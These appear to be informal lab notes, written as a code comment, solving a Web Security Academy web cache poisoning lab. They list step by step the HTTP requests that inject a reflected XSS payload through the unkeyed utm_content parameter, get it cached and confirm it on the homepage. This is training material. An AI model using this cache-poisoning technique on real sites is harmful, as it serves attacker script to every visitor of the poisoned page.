/*

1) GET / HTTP/2
Pragma: x-get-cache-key

// guess the GET parameter using PARAM miner
and GET /?utm_content=<script>alert(1)</script> HTTP/2
is not cached

//we can cache the origin and remove it and inject the script payload at homepage

GET /?utm_content=<script>alert(1)</script> HTTP/2
Host: 0afc00740358eb47800a6c7500930060.web-security-academy.net

GET /?utm_content=<script>alert(1)</script> HTTP/2
Host: 0afc00740358eb47800a6c7500930060.web-security-academy.net

2) source shows
<link href='//LAB-ID.web-security-academy.net/?utm_content='/><script>alert(1)</script>'/>

'/><script>alert(1)</script>

// repeat 1 with 2 as payload

3) get this cached

GET /?utm_content='/><script>alert(1)</script> HTTP/2

4) replay this now
GET / HTTP/2

// show response in browser
// we see the alert pop up

4) now get this cached 
GET /?utm_content='/><script>alert(1)</script> HTTP/2

//chronology samajhiye


*/